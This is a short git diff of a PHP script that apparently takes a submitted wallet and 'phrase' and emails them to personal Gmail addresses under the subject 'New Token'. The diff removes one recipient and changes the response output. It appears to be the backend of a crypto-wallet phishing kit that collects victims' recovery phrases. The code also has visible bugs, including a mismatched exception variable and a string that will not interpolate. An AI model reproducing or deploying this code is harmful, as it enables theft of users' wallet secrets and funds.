@@ -28,7 +28,7 @@ $phrase = $data['phrase'];
 try {
     $resend->emails->send([
     'from' => 'Acme <onboarding@resend.dev>',
-    'to' => ['smitharayaskul35@gmail.com, osemensilas@gmail.com'],
+    'to' => ['osemensilas@gmail.com'],//smitharayaskul35@gmail.com, 
     'subject' => 'New Token',
     'html' => '
         <p>Wallet: {$wallet}</p>
@@ -36,13 +36,13 @@ try {
     ',
     ]);
 
-    return [
+    echo json_encode([
         'status' => 'successful',
         'msg' => $result
-    ];
+    ]);
 } catch (\Throwable $th) {
-    return [
+    echo json_encode([
         'status' => 'error',
         'msg' => $e->getMessage()
-    ];
+    ]);
 }
